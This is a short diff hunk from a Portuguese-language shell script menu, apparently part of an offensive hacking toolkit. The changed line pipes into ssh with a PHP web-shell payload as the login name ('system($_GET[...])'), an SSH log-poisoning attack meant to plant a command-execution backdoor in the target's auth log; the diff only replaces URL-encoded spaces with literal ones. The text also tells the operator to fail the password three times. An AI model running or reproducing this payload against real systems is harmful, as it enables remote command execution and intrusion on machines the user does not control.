@@ -1197,7 +1197,7 @@ do
 		    echo "Digite o IP do Alvo"
                     read ip
                     echo "Aguarde..erre a senha 3 vezes.."
-                    echo teste |  ssh '<?php%20system($_GET["sw1tchbl4d3"]);%20?>'@$ip
+                    echo teste |  ssh '<?php system($_GET["sw1tchbl4d3"]); ?>'@$ip
 	   ;;
 	   
 	   
